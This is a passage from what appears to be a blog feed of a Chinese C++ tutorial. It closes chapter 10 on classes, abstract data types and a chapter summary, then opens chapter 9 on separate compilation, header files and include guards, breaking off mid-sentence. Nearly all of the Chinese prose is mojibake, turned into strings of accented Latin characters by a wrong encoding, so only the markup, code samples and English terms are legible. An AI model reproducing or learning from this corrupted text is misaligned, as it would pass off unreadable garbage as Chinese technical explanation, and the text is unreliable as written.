const</code> (æ•´å‹/æšä¸¾) æˆ– <code>static constexpr</code> (C++11, æ¨è) åœ¨ç±»å†…éƒ¨å®šä¹‰å¸¸é‡ã€‚</li><li>  C++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (<code>enum class</code> æˆ– <code>enum struct</code>)**ï¼Œå…¶æšä¸¾é‡ä½œç”¨åŸŸé™åˆ¶åœ¨æšä¸¾å†…ï¼Œä¸”ä¸èƒ½éšå¼è½¬æ¢ä¸ºæ•´å‹ï¼Œæé«˜äº†ä»£ç çš„å®‰å…¨æ€§å’Œæ¸…æ™°åº¦ã€‚</li></ul><h2 id="10-7-æŠ½è±¡æ•°æ®ç±»å‹"><a href="#10-7-æŠ½è±¡æ•°æ®ç±»å‹" class="headerlink" title="10.7 æŠ½è±¡æ•°æ®ç±»å‹"></a>10.7 æŠ½è±¡æ•°æ®ç±»å‹</h2><p>æˆ‘ä»¬åœ¨æœ¬ç« ä¸­å­¦ä¹ çš„ç±»æ˜¯ C++ å®ç°<strong>æŠ½è±¡æ•°æ®ç±»å‹ (Abstract Data Type, ADT)</strong> çš„ä¸€ç§æ–¹å¼ã€‚ADT æ˜¯ä¸€ç§è®¡ç®—æœºç§‘å­¦çš„æ¦‚å¿µï¼Œå®ƒæ˜¯ä¸€ç§<strong>æ•°å­¦æ¨¡å‹</strong>ï¼Œç”¨äºæè¿°å…·æœ‰ç‰¹å®šè¡Œä¸ºï¼ˆè¯­ä¹‰ï¼‰çš„æ•°æ®ç±»å‹ï¼Œé‡ç‚¹åœ¨äº<strong>å¯ä»¥å¯¹æ•°æ®æ‰§è¡Œçš„æ“ä½œ</strong>ï¼Œè€Œä¸æ˜¯è¿™äº›æ“ä½œçš„å…·ä½“å®ç°æ–¹å¼æˆ–æ•°æ®çš„å†…éƒ¨è¡¨ç¤ºã€‚</p><p><strong>ADT çš„æ ¸å¿ƒæ€æƒ³:</strong></p><ol><li> <strong>æ•°æ®å°è£…:</strong> ADT å°†æ•°æ®ä»¥åŠå¯¹è¿™äº›æ•°æ®è¿›è¡Œæ“ä½œçš„å‡½æ•°æ†ç»‘åœ¨ä¸€èµ·ã€‚</li><li> <strong>æ¥å£ä¸å®ç°åˆ†ç¦»:</strong> ADT å®šä¹‰äº†ä¸€ä¸ª<strong>å…¬å…±æ¥å£ (Interface)**ï¼Œå³ä¸€ç»„å¯ä»¥å¯¹æ•°æ®æ‰§è¡Œçš„æ“ä½œã€‚ç”¨æˆ·é€šè¿‡è¿™ä¸ªæ¥å£ä¸æ•°æ®äº¤äº’ï¼Œè€Œä¸éœ€è¦çŸ¥é“æ•°æ®æ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Œæˆ–è€…æ“ä½œæ˜¯å¦‚ä½•å®ç°çš„ï¼ˆ</strong>å®ç°ç»†èŠ‚éšè—**ï¼‰ã€‚</li></ol><p>å¯ä»¥æŠŠ ADT æƒ³è±¡æˆä¸€ä¸ªâ€œé»‘ç›’å­â€ã€‚ä½ çŸ¥é“ä½ å¯ä»¥ç»™è¿™ä¸ªç›’å­æä¾›ä»€ä¹ˆè¾“å…¥ï¼ˆé€šè¿‡æ¥å£è°ƒç”¨æ“ä½œï¼‰ï¼Œä»¥åŠä½ ä¼šå¾—åˆ°ä»€ä¹ˆè¾“å‡ºæˆ–ç»“æœï¼Œä½†ä½ ä¸éœ€è¦ï¼ˆä¹Ÿä¸èƒ½ï¼‰çœ‹åˆ°ç›’å­å†…éƒ¨çš„æ„é€ ã€‚</p><p><strong>ä¸å†…ç½®ç±»å‹çš„ç±»æ¯”:</strong></p><p>æƒ³æƒ³ C++ çš„å†…ç½®ç±»å‹ <code>int</code>ã€‚</p><ul><li>  <strong>æ•°æ®:</strong> å®ƒå¯ä»¥è¡¨ç¤ºæ•´æ•°ã€‚</li><li>  <strong>æ“ä½œ:</strong> ä½ å¯ä»¥å¯¹ <code>int</code> æ‰§è¡ŒåŠ ã€å‡ã€ä¹˜ã€é™¤ã€æ¯”è¾ƒç­‰æ“ä½œã€‚</li><li>  <strong>æŠ½è±¡:</strong> ä½ ä½¿ç”¨è¿™äº›æ“ä½œæ—¶ï¼Œå¹¶ä¸éœ€è¦å…³å¿ƒ <code>int</code> åœ¨å†…å­˜ä¸­æ˜¯å¦‚ä½•ç”¨äºŒè¿›åˆ¶ä½è¡¨ç¤ºçš„ï¼Œæˆ–è€…åŠ æ³•æ“ä½œåœ¨ CPU å±‚é¢æ˜¯å¦‚ä½•æ‰§è¡Œçš„ã€‚ä½ åªå…³å¿ƒæ“ä½œçš„<strong>æ•ˆæœ</strong>ã€‚</li></ul><p>ADT å°†è¿™ç§æ€æƒ³æ‰©å±•åˆ°äº†ç”¨æˆ·è‡ªå®šä¹‰çš„æ•°æ®ç±»å‹ã€‚</p><p><strong>C++ ç±»å¦‚ä½•å®ç° ADT:</strong></p><p>C++ ç±»å¤©ç„¶åœ°æ”¯æŒ ADT çš„æ¦‚å¿µï¼š</p><ul><li>  <strong>æ•°æ®è¡¨ç¤º:</strong> ç±»çš„æ•°æ®æˆå‘˜ï¼ˆé€šå¸¸æ˜¯ <code>private</code>ï¼‰ç”¨äºå­˜å‚¨ ADT çš„æ•°æ®ã€‚</li><li>  <strong>æ“ä½œæ¥å£:</strong> ç±»çš„å…¬æœ‰æˆå‘˜å‡½æ•°ï¼ˆ<code>public</code> methodsï¼‰å®šä¹‰äº† ADT çš„å…¬å…±æ¥å£ï¼Œå³å…è®¸å¤–éƒ¨ä»£ç æ‰§è¡Œçš„æ“ä½œã€‚</li><li>  <strong>å®ç°éšè—:</strong> å°†æ•°æ®æˆå‘˜è®¾ä¸º <code>private</code>ï¼Œå¹¶å°†å®ç°ç»†èŠ‚ï¼ˆå¦‚ç§æœ‰è¾…åŠ©å‡½æ•°ã€æˆå‘˜å‡½æ•°çš„å…·ä½“ä»£ç ï¼‰ä¸æ¥å£ï¼ˆç±»å®šä¹‰ä¸­çš„å…¬æœ‰å£°æ˜ï¼‰åˆ†ç¦»ï¼Œå®ç°äº†æ•°æ®éšè—å’Œå°è£…ã€‚</li></ul><p><strong>ä»¥ <code>Stock</code> ç±»ä¸ºä¾‹:</strong></p><p>æˆ‘ä»¬å¯ä»¥å°† <code>Stock</code> ç±»è§†ä¸ºä¸€ä¸ªâ€œè‚¡ç¥¨æŒæœ‰â€ ADTã€‚</p><ul><li>  <strong>ADT æè¿°:</strong> ä¸€ä¸ªè¡¨ç¤ºæŸå…¬å¸è‚¡ç¥¨æŒæœ‰æƒ…å†µçš„ç±»å‹ã€‚</li><li>  <strong>æ•°æ® (æ¦‚å¿µä¸Š):</strong> å…¬å¸åç§°ã€æŒæœ‰è‚¡æ•°ã€å½“å‰è‚¡ä»·ã€æ€»ä»·å€¼ã€‚</li><li><strong>æ“ä½œ (æ¥å£):</strong><ul><li>  åˆ›å»ºä¸€ä¸ªè‚¡ç¥¨æŒæœ‰è®°å½•ï¼ˆæ„é€ å‡½æ•°ï¼‰ã€‚</li><li>  ä¹°å…¥æŒ‡å®šæ•°é‡çš„è‚¡ç¥¨ï¼ˆ<code>buy</code> æ–¹æ³•ï¼‰ã€‚</li><li>  å–å‡ºæŒ‡å®šæ•°é‡çš„è‚¡ç¥¨ï¼ˆ<code>sell</code> æ–¹æ³•ï¼‰ã€‚</li><li>  æ›´æ–°è‚¡ç¥¨ä»·æ ¼ï¼ˆ<code>update</code> æ–¹æ³•ï¼‰ã€‚</li><li>  æ˜¾ç¤ºè‚¡ç¥¨æŒæœ‰ä¿¡æ¯ï¼ˆ<code>show</code> æ–¹æ³•ï¼‰ã€‚</li><li>  (å¯èƒ½è¿˜æœ‰) è·å–æ€»ä»·å€¼ã€è·å–å…¬å¸åç§°ç­‰ã€‚</li></ul></li><li><strong>å®ç° (éšè—ç»†èŠ‚):</strong><ul><li>  æ•°æ®æˆå‘˜ <code>company</code>, <code>shares</code>, <code>share_val</code>, <code>total_val</code> çš„å…·ä½“ç±»å‹ï¼ˆ<code>std::string</code>, <code>long</code>, <code>double</code>ï¼‰ã€‚</li><li>  ç§æœ‰è¾…åŠ©å‡½æ•° <code>set_tot()</code> çš„å­˜åœ¨åŠå…¶å®ç°ã€‚</li><li>  <code>buy</code>, <code>sell</code>, <code>update</code>, <code>show</code> ç­‰å‡½æ•°çš„å…·ä½“ä»£ç é€»è¾‘ã€‚</li></ul></li></ul><p>ä½¿ç”¨ <code>Stock</code> ç±»çš„ç¨‹åºå‘˜ï¼ˆå®¢æˆ·ç«¯ä»£ç ï¼‰åªéœ€è¦äº†è§£å…¶å…¬å…±æ¥å£ï¼ˆ<code>public</code> æ–¹æ³•ï¼‰ã€‚ä»–ä»¬å¯ä»¥åˆ›å»º <code>Stock</code> å¯¹è±¡ï¼Œè°ƒç”¨ <code>buy()</code>, <code>sell()</code>, <code>show()</code> ç­‰æ–¹æ³•æ¥å®Œæˆä»»åŠ¡ï¼Œè€Œæ— éœ€å…³å¿ƒ <code>total_val</code> æ˜¯å¦‚ä½•è®¡ç®—å’Œæ›´æ–°çš„ï¼Œæˆ–è€… <code>company</code> æ˜¯ç”¨ <code>std::string</code> è¿˜æ˜¯ C é£æ ¼å­—ç¬¦ä¸²å­˜å‚¨çš„ã€‚å¦‚æœç±»çš„è®¾è®¡è€…å†³å®šæ”¹å˜å†…éƒ¨å®ç°ï¼ˆä¾‹å¦‚ï¼Œä¼˜åŒ– <code>set_tot</code> çš„è®¡ç®—ï¼‰ï¼Œåªè¦å…¬å…±æ¥å£ä¿æŒä¸å˜ï¼Œå®¢æˆ·ç«¯ä»£ç å°±æ— éœ€ä¿®æ”¹ã€‚</p><p><strong>ADT çš„å¥½å¤„:</strong></p><ul><li>  <strong>æŠ½è±¡:</strong> ç®€åŒ–å¤æ‚æ€§ï¼Œè®©ç”¨æˆ·å…³æ³¨â€œåšä»€ä¹ˆâ€è€Œéâ€œæ€ä¹ˆåšâ€ã€‚</li><li>  <strong>å°è£…:</strong> ä¿æŠ¤æ•°æ®ä¸è¢«æ„å¤–ç ´åï¼Œéšè—å®ç°ç»†èŠ‚ã€‚</li><li>  <strong>æ¨¡å—åŒ–:</strong> å°†ç¨‹åºåˆ†è§£ä¸ºç‹¬ç«‹çš„ã€åŠŸèƒ½æ˜ç¡®çš„å•å…ƒï¼ˆç±»/ADTï¼‰ã€‚</li><li>  <strong>å¯ç»´æŠ¤æ€§:</strong> ä¿®æ”¹ä¸€ä¸ª ADT çš„å†…éƒ¨å®ç°ä¸ä¼šå½±å“ä½¿ç”¨è¯¥ ADT çš„å…¶ä»–ä»£ç ï¼ˆåªè¦æ¥å£ä¸å˜ï¼‰ã€‚</li><li>  <strong>å¯é‡ç”¨æ€§:</strong> è®¾è®¡è‰¯å¥½çš„ ADT å¯ä»¥åœ¨ä¸åŒçš„ç¨‹åºä¸­é‡å¤ä½¿ç”¨ã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨è®¾è®¡ C++ ç±»æ—¶ï¼Œä»¥ ADT çš„æ€ç»´æ–¹å¼è¿›è¡Œæ€è€ƒâ€”â€”æ˜ç¡®è¿™ä¸ªç±»ä»£è¡¨ä»€ä¹ˆæ¦‚å¿µï¼Œå®ƒåº”è¯¥æä¾›å“ªäº›æ“ä½œï¼ˆå…¬å…±æ¥å£ï¼‰ï¼Œä»¥åŠéœ€è¦éšè—å“ªäº›å†…éƒ¨ç»†èŠ‚â€”â€”æ˜¯éå¸¸æœ‰ç›Šçš„ã€‚è¿™æœ‰åŠ©äºåˆ›å»ºå‡ºç»“æ„æ¸…æ™°ã€æ˜“äºä½¿ç”¨å’Œç»´æŠ¤çš„ä»£ç ã€‚</p><h2 id="10-8-æ€»ç»“"><a href="#10-8-æ€»ç»“" class="headerlink" title="10.8 æ€»ç»“"></a>10.8 æ€»ç»“</h2><p>æœ¬ç« ä»‹ç»äº†é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„æ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶æ·±å…¥æ¢è®¨äº† C++ å®ç° OOP çš„ä¸»è¦æœºåˆ¶â€”â€”**ç±» (Class)**ã€‚ç±»æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹çš„åŸºç¡€ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†æ•°æ®å’Œæ“ä½œæ•°æ®çš„å‡½æ•°å°è£…åœ¨ä¸€èµ·ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p> <strong>è¿‡ç¨‹æ€§ç¼–ç¨‹ vs. é¢å‘å¯¹è±¡ç¼–ç¨‹:</strong> è¿‡ç¨‹æ€§ç¼–ç¨‹å…³æ³¨æ‰§è¡Œæ­¥éª¤å’Œå‡½æ•°ï¼Œè€Œé¢å‘å¯¹è±¡ç¼–ç¨‹å…³æ³¨æ•°æ®åŠå…¶ç›¸å…³æ“ä½œï¼Œå°†å®ƒä»¬å°è£…åœ¨<strong>å¯¹è±¡ (Object)</strong> ä¸­ã€‚OOP çš„æ ¸å¿ƒæ€æƒ³åŒ…æ‹¬å°è£…ã€æŠ½è±¡ã€ç»§æ‰¿å’Œå¤šæ€ã€‚</p></li><li><p><strong>æŠ½è±¡å’Œç±»:</strong></p><ul><li>  <strong>æŠ½è±¡</strong>æ˜¯å…³æ³¨æœ¬è´¨ç‰¹å¾ã€å¿½ç•¥å®ç°ç»†èŠ‚çš„è¿‡ç¨‹ã€‚</li><li>  <strong>ç±»</strong>æ˜¯åˆ›å»ºå¯¹è±¡çš„è“å›¾ï¼Œå®šä¹‰äº†å¯¹è±¡çš„<strong>æ•°æ®æˆå‘˜ï¼ˆå±æ€§ï¼‰</strong>å’Œ<strong>æˆå‘˜å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰</strong>ã€‚</li><li>  <strong>è®¿é—®è¯´æ˜ç¬¦</strong>ï¼ˆ<code>public</code>, <code>private</code>, <code>protected</code>ï¼‰æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚<code>public</code> æˆå‘˜æ„æˆç±»çš„<strong>å…¬å…±æ¥å£</strong>ï¼Œè€Œ <code>private</code> æˆå‘˜ï¼ˆé€šå¸¸æ˜¯æ•°æ®ï¼‰å®ç°äº†<strong>æ•°æ®éšè—</strong>ï¼Œæ˜¯<strong>å°è£…</strong>çš„å…³é”®ã€‚</li><li>  ç±»çš„æˆå‘˜å‡½æ•°é€šå¸¸åœ¨ç±»å®šä¹‰ä¸­å£°æ˜ï¼Œåœ¨å•ç‹¬çš„æºæ–‡ä»¶ä¸­ä½¿ç”¨<strong>ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ <code>::</code></strong> å®šä¹‰ã€‚</li><li>  é€šè¿‡ç±»çš„å¯¹è±¡ä½¿ç”¨**ç‚¹å· <code>.</code>**ï¼ˆæˆ–æŒ‡é’ˆä½¿ç”¨ç®­å¤´ <code>-&gt;</code>ï¼‰è®¿é—®å…¶å…¬æœ‰æˆå‘˜ã€‚</li></ul></li><li><p><strong>æ„é€ å‡½æ•°å’Œææ„å‡½æ•°:</strong></p><ul><li>  <strong>æ„é€ å‡½æ•°</strong>æ˜¯ä¸ç±»åŒåçš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºåˆå§‹åŒ–å¯¹è±¡ã€‚å®ƒå¯ä»¥è¢«é‡è½½ã€‚å¦‚æœç”¨æˆ·æœªå®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ï¼ˆæ— å‚ï¼‰ã€‚å¦‚æœç”¨æˆ·å®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨å°±ä¸å†ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚</li><li>  <strong>ææ„å‡½æ•°</strong>æ˜¯ç±»åå‰åŠ  <code>~</code> çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼Œåœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œç”¨äºæ‰§è¡Œæ¸…ç†å·¥ä½œï¼ˆå¦‚é‡Šæ”¾ <code>new</code> åˆ†é…çš„å†…å­˜ï¼‰ã€‚å®ƒæ²¡æœ‰å‚æ•°ï¼Œä¸èƒ½é‡è½½ã€‚</li></ul></li><li><p><strong><code>this</code> æŒ‡é’ˆ:</strong></p><ul><li>  æ¯ä¸ªéé™æ€æˆå‘˜å‡½æ•°éƒ½æœ‰ä¸€ä¸ªéšå«çš„ <code>this</code> æŒ‡é’ˆï¼ŒæŒ‡å‘è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚</li><li>  é€šå¸¸éšå¼ä½¿ç”¨ï¼Œä½†åœ¨éœ€è¦åŒºåˆ†åŒåå‚æ•°å’Œæˆå‘˜ã€æˆ–éœ€è¦è¿”å›å¯¹è±¡è‡ªèº«å¼•ç”¨/æŒ‡é’ˆï¼ˆå¦‚é“¾å¼è°ƒç”¨ï¼‰æ—¶æ˜¾å¼ä½¿ç”¨ <code>this</code> æˆ– <code>*this</code>ã€‚</li></ul></li><li><p><strong>å¯¹è±¡æ•°ç»„:</strong></p><ul><li>  å¯ä»¥åˆ›å»ºç±»å¯¹è±¡çš„æ•°ç»„ã€‚</li><li>  åˆ›å»ºæ•°ç»„æ—¶ï¼Œä¼šä¸ºæ¯ä¸ªå…ƒç´ è°ƒç”¨æ„é€ å‡½æ•°ï¼ˆé€šå¸¸æ˜¯é»˜è®¤æ„é€ å‡½æ•°ï¼Œé™¤éä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ï¼‰ã€‚</li><li>  è®¿é—®æ–¹å¼ä¸º <code>arrayName[index].member</code>ã€‚</li><li>  åŠ¨æ€å¯¹è±¡æ•°ç»„ä½¿ç”¨ <code>new ClassName[size]</code> åˆ›å»ºï¼Œéœ€è¦é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¹¶ç”¨ <code>delete [] ptr</code> é‡Šæ”¾ã€‚</li></ul></li><li><p><strong>ç±»ä½œç”¨åŸŸ:</strong></p><ul><li>  ç±»æˆå‘˜ï¼ˆæ•°æ®ã€å‡½æ•°ã€ç±»å‹ã€å¸¸é‡ã€æšä¸¾ï¼‰å…·æœ‰ç±»ä½œç”¨åŸŸï¼Œåœ¨ç±»å¤–éƒ¨è®¿é—®éœ€è¦é™å®šã€‚</li><li>  å¯ä»¥ä½¿ç”¨ <code>static const</code> æˆ– <code>static constexpr</code> (C++11 æ¨è) å®šä¹‰ç±»èŒƒå›´å†…çš„å¸¸é‡ã€‚</li><li>  C++11 å¼•å…¥äº†**ä½œç”¨åŸŸå†…æšä¸¾ (<code>enum class</code>)**ï¼Œæé«˜äº†æšä¸¾çš„ç±»å‹å®‰å…¨æ€§å’Œä½œç”¨åŸŸæ§åˆ¶ã€‚</li></ul></li><li><p><strong>æŠ½è±¡æ•°æ®ç±»å‹ (ADT):</strong></p><ul><li>  ADT æ˜¯ä¸€ä¸ªä¾§é‡äºæ“ä½œæ¥å£è€Œéå†…éƒ¨å®ç°çš„æ•°å­¦æ¨¡å‹ã€‚</li><li>  C++ ç±»æ˜¯å®ç° ADT çš„å¼ºå¤§å·¥å…·ï¼Œé€šè¿‡å…¬å…±æ¥å£æä¾›æ“ä½œï¼Œé€šè¿‡ç§æœ‰æˆå‘˜éšè—å®ç°ç»†èŠ‚ï¼Œä½“ç°äº†å°è£…å’ŒæŠ½è±¡çš„åŸåˆ™ã€‚</li></ul></li></ol><p>é€šè¿‡ä½¿ç”¨ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºæ¨¡å—åŒ–ã€å¯é‡ç”¨ã€æ˜“äºç»´æŠ¤çš„å¤æ‚ç¨‹åºï¼Œæ›´å¥½åœ°æ¨¡æ‹Ÿç°å®ä¸–ç•Œçš„é—®é¢˜ã€‚æŒæ¡ç±»çš„è®¾è®¡å’Œä½¿ç”¨æ˜¯ç²¾é€š C++ çš„å…³é”®ä¸€æ­¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 9 å†…å­˜æ¨¡å‹å’Œåç§°ç©ºé—´</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_9/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_9/</url>
      
        <content type="html"><![CDATA[<h2 id="9-1-å•ç‹¬ç¼–è¯‘"><a href="#9-1-å•ç‹¬ç¼–è¯‘" class="headerlink" title="9.1 å•ç‹¬ç¼–è¯‘"></a>9.1 å•ç‹¬ç¼–è¯‘</h2><p>éšç€ç¨‹åºå˜å¾—è¶Šæ¥è¶Šå¤§ï¼Œå°†æ‰€æœ‰ä»£ç éƒ½æ”¾åœ¨ä¸€ä¸ªå·¨å¤§çš„ <code>main.cpp</code> æ–‡ä»¶ä¸­ä¼šå˜å¾—éš¾ä»¥ç®¡ç†å’Œç»´æŠ¤ã€‚C++ æ”¯æŒ**å•ç‹¬ç¼–è¯‘ (Separate Compilation)**ï¼Œå…è®¸æˆ‘ä»¬å°†ç¨‹åºåˆ†è§£æˆå¤šä¸ªç‹¬ç«‹çš„æºæ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ <code>.cpp</code> æ–‡ä»¶ï¼‰å’Œå¤´æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯ <code>.h</code> æˆ– <code>.hpp</code> æ–‡ä»¶ï¼‰ã€‚</p><p><strong>è¿™æ ·åšçš„å¥½å¤„:</strong></p><ol><li> <strong>ç»„ç»‡æ€§:</strong> å°†ç›¸å…³çš„å‡½æ•°ã€ç±»ç­‰æ”¾åœ¨ä¸åŒçš„æ–‡ä»¶ä¸­ï¼Œä½¿é¡¹ç›®ç»“æ„æ›´æ¸…æ™°ã€‚</li><li> <strong>å¯é‡ç”¨æ€§:</strong> å¯ä»¥å°†é€šç”¨çš„åŠŸèƒ½ï¼ˆå¦‚å·¥å…·å‡½æ•°ã€ç±»å®šä¹‰ï¼‰æ”¾åœ¨å•ç‹¬çš„æ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿åœ¨å…¶ä»–é¡¹ç›®ä¸­é‡ç”¨ã€‚</li><li> <strong>æ¨¡å—åŒ–:</strong> æ¯ä¸ªæ–‡ä»¶å¯ä»¥ä¸“æ³¨äºç‰¹å®šçš„åŠŸèƒ½æ¨¡å—ã€‚</li><li> <strong>ç¼–è¯‘æ•ˆç‡:</strong> å½“ä¿®æ”¹æŸä¸ª <code>.cpp</code> æ–‡ä»¶æ—¶ï¼Œé€šå¸¸åªéœ€è¦é‡æ–°ç¼–è¯‘è¯¥æ–‡ä»¶ï¼Œç„¶åä¸å…¶ä»–æœªæ”¹å˜çš„ç›®æ ‡æ–‡ä»¶é‡æ–°é“¾æ¥å³å¯ï¼Œæ— éœ€é‡æ–°ç¼–è¯‘æ•´ä¸ªé¡¹ç›®ï¼Œå¤§å¤§èŠ‚çœäº†ç¼–è¯‘æ—¶é—´ã€‚</li></ol><h3 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h3><p>å•ç‹¬ç¼–è¯‘é€šå¸¸æ¶‰åŠä¸¤ç§ä¸»è¦çš„æ–‡ä»¶ç±»å‹ï¼š</p><ol><li><p><strong>å¤´æ–‡ä»¶ (<code>.h</code> æˆ– <code>.hpp</code>)</strong>:</p><ul><li>  <strong>ç›®çš„:</strong> åŒ…å«**å£°æ˜ (Declarations)**ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨æŸä¸ªå‡½æ•°ã€ç±»æˆ–å˜é‡çš„â€œæ¥å£â€æ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä½†ä¸åŒ…å«å…·ä½“çš„å®ç°ä»£ç ï¼ˆé™¤äº†æ¨¡æ¿å’Œå†…è”å‡½æ•°ï¼‰ã€‚</li><li><strong>å…¸å‹å†…å®¹:</strong><ul><li>  å‡½æ•°åŸå‹ï¼ˆå‡½æ•°å£°æ˜ï¼‰</li><li>  ç±» (class) å®šä¹‰</li><li>  ç»“æ„ (struct) å®šä¹‰</li><li>  æšä¸¾ (enum) å®šä¹‰</li><li>  æ¨¡æ¿ (template) å®šä¹‰</li><li>  å†…è”å‡½æ•° (inline) å®šä¹‰</li><li>  <code>const</code> å¸¸é‡å®šä¹‰</li><li>  <code>using</code> å£°æ˜æˆ–æŒ‡ä»¤</li></ul></li><li>  <strong><code>#include</code> æŒ‡ä»¤:</strong> æºæ–‡ä»¶é€šè¿‡ <code>#include &quot;header_file.h&quot;</code> æŒ‡ä»¤å°†å¤´æ–‡ä»¶çš„å†…å®¹åŒ…å«è¿›æ¥ï¼Œä»¥ä¾¿ç¼–è¯‘å™¨çŸ¥é“å¦‚ä½•ä½¿ç”¨å…¶ä¸­å£°æ˜çš„å‡½æ•°æˆ–ç±»ã€‚</li><li><strong>åŒ…å«å«å“¨ (Include Guards):</strong> ä¸ºäº†é˜²æ­¢åŒä¸€ä¸ªå¤´æ–‡ä»¶è¢«æ„å¤–åœ°å¤šæ¬¡åŒ…å«åˆ°åŒä¸€ä¸ªæºæ–‡ä»¶ä¸­ï¼ˆè¿™å¯èƒ½å¯¼è‡´é‡å®šä¹‰é”™è¯¯ï¼‰ï¼Œå¤´æ–‡ä»¶é€šå¸¸ä½¿ç”¨<strong>åŒ…å«å«å“¨</strong>ã€‚  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MYHEADER_H_ <span class="comment">// å¦‚æœ MYHEADER_H_ è¿˜æ²¡æœ‰è¢«å®šä¹‰è¿‡</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MYHEADER_H_ <span class="comment">// å°±å®šä¹‰ MYHEADER_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤´æ–‡ä»¶çš„å®é™…å†…å®¹æ”¾åœ¨è¿™é‡Œ...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MYHEADER_H_</span></span></span><br></pre></td></tr></table></figure>  æˆ–è€…ä½¿ç”¨ C++ ç‰¹æœ‰çš„ <code>#pragma once</code> æŒ‡ä»¤ï¼ˆæ›´ç®€æ´ï¼Œä½†ä¸æ˜¯æ‰€æœ‰ç¼–è¯‘å™¨éƒ½æ”¯æŒï¼Œå°½ç®¡éå¸¸æ™®éï¼‰ï¼š  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// myheader.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤´æ–‡ä»¶çš„å®é™…å†…å®¹æ”¾åœ¨è¿™é‡Œ...</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_function</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> &#123;</span> <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>æºæ–‡ä»¶ (<code>.cpp</code>)</strong>:</p><ul><li>  <strong>ç›®çš„:</strong> åŒ…å«**å®šä¹‰ (Definitions)**ï¼Œå³å‡½æ•°æˆ–æ–¹æ³•çš„å…·ä½“å®ç°ä»£ç ï¼Œä»¥åŠå…¨å±€å˜é‡çš„å®šä¹‰å’Œåˆå§‹åŒ–ã€‚</li><li><strong>å…¸å‹å†…å®¹:</strong><ul><li>  å‡½æ•°ä½“ï¼ˆå®ç°ï¼‰</li><li>  ç±»æˆå‘˜å‡½æ•°çš„å®ç°</li><li>  å…¨å±€å˜é‡çš„å®šä¹‰å’Œåˆå§‹åŒ–</li><li>  <code>main</code> å‡½æ•°ï¼ˆé€šå¸¸åœ¨ä¸€ä¸ªå•ç‹¬çš„ <code>.cpp</code> æ–‡ä»¶ä¸­ï¼‰</li></ul></li><li>  <strong>ç¼–è¯‘:</strong> æ¯ä¸ª <code>.cpp</code> æ–‡ä»¶é€šå¸¸ä¼šè¢«ç¼–è¯‘å™¨<strong>ç‹¬ç«‹åœ°</strong>ç¼–è¯‘æˆä¸€ä¸ª**ç›®æ ‡æ–‡ä»¶ (Object File)**ï¼ˆé€šå¸¸æ˜¯ <code>.obj</code> æˆ– <code>.o</code> æ–‡ä»¶ï¼‰ã€‚ç›®æ ‡æ–‡ä»¶åŒ…å«äº†è¯¥æºæ–‡ä»¶å¯¹åº”çš„æœºå™¨ä»£ç 